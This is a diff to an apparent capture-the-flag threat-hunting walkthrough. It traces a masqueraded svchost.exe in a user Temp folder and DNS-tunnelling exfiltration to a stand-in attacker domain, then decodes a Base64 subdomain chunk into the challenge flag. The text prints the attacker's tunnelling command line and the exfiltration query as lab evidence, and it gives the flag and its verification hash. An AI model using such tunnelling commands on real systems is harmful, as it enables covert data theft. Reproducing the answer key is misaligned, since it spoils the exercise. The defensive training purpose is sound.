@@ -32,13 +32,14 @@ Follow these sequential steps in the interactive Marimo notebook or in your SIEM
    - Adversaries often rename malicious tools to `svchost.exe`, `lsass.exe`, or `csrss.exe` to blend in with background operating system services.
    - Legitimate Windows `svchost.exe` is **strictly located in `C:\Windows\System32\`** or `C:\Windows\SysWOW64\`. Any execution from user directories (`AppData`, `Temp`, `Users`) indicates malicious masquerading (MITRE T1036.005).
 2. **Filter Sysmon Process Telemetry**:
-   - In **Step 1: Endpoint Process Masquerading Analysis**, inspect the process table with filter `svchost`.
-3. **Isolate the Rogue Binary**:
-   - Notice the prominent red alert callout:
+   - In **Step 1: Endpoint Process Masquerading Analysis**, inspect the process table using the interactive `Process Filter:` input box.
+   - Type `svchost` or `temp` to filter the endpoint process list.
+3. **Isolate the Rogue Binary & Dynamic Alert**:
+   - Marimo's reactive engine immediately displays a high-priority alert callout:
      - **Process Name**: `svchost.exe` (PID: `4892`)
      - **Image Path**: `C:\Users\jsmith\AppData\Local\Temp\svchost.exe`
      - **User Context**: `CORP\jsmith`
-     - **Parent Process**: `explorer.exe` (or user script)
+     - **Parent Process**: `explorer.exe`
      - **Command Line**:
        ```bat
        svchost.exe -tunnel -domain ns-tunnel.attacker-dns.org
@@ -59,7 +60,7 @@ Follow these sequential steps in the interactive Marimo notebook or in your SIEM
 3. **Filter by the Discovered Attacker Domain**:
    - In the `Domain Filter:` text box, type `attacker-dns.org`.
 4. **Identify the Exfiltration Queries**:
-   - Observe query:
+   - Observe the anomalous high-entropy query:
      ```text
      exfil-payload.RkxBR3tkbnNfdHVubmVsaW5nX2RhdGFfZXhmaWxfdW5jb3ZlcmVkfQ.ns-tunnel.attacker-dns.org
      ```
@@ -69,15 +70,14 @@ Follow these sequential steps in the interactive Marimo notebook or in your SIEM
 
 ---
 
-### Step 3: Subdomain Payload Reassembly & Decoding
+### Step 3: Subdomain Payload Reassembly & Decoder Workbench
 
 1. **Extract the Subdomain Encoded Chunk**:
-   - In **Step 3: Subdomain Payload Reassembly & Decoder Workbench**, notice that the Base64 URL-safe chunk between `exfil-payload.` and `.ns-tunnel` is automatically extracted:
+   - Identify the Base64 URL-safe chunk between `exfil-payload.` and `.ns-tunnel`:
      `RkxBR3tkbnNfdHVubmVsaW5nX2RhdGFfZXhmaWxfdW5jb3ZlcmVkfQ`
-2. **Decode the Secret**:
-   - The workbench applies URL-safe Base64 decoding with padding calculation:
-     `base64.urlsafe_b64decode(chunk + "==")`
-   - Decoded output:
+2. **Reassemble & Decode in the Workbench**:
+   - In **Step 3: Subdomain Payload Reassembly & Decoder Workbench**, paste `RkxBR3tkbnNfdHVubmVsaW5nX2RhdGFfZXhmaWxfdW5jb3ZlcmVkfQ` into the **Subdomain Encoded Data Chunk:** text area.
+   - The reactive decoder dynamically recalculates URL-safe Base64 padding (`base64.urlsafe_b64decode(padded)`) and displays the plaintext:
      ```text
      FLAG{dns_tunneling_data_exfil_uncovered}
      ```
@@ -86,10 +86,11 @@ Follow these sequential steps in the interactive Marimo notebook or in your SIEM
 
 ### Step 4: Flag Verification & Submission
 
-1. **Verify the Flag**:
-   - In **Step 4: Verify Incident Flag & Hunt Findings**, input:
+1. **Verify the Flag (Anti-Cheat SHA-256 Check)**:
+   - In **Step 4: Verify Incident Flag & Hunt Findings**, enter the recovered flag:
      `FLAG{dns_tunneling_data_exfil_uncovered}`
-   - Confirm the green verification card: `🎉 FLAG VERIFIED CORRECT!`.
+   - The notebook validates the submission against the constant-time SHA-256 target hash (`16e9a50ab214cbca3ad49f5c4b2e770122689fad6a26f71e9323afc27f4669d9`).
+   - Upon verification, the green card triggers (`🎉 FLAG VERIFIED CORRECT!`) and unlocks the **Confirmed Threat Hunting Findings (IOCs)** summary table.
 2. **Submit to Portal**:
    - Copy `FLAG{dns_tunneling_data_exfil_uncovered}` into the CyberLab challenge submission pane to claim 200 points.
 
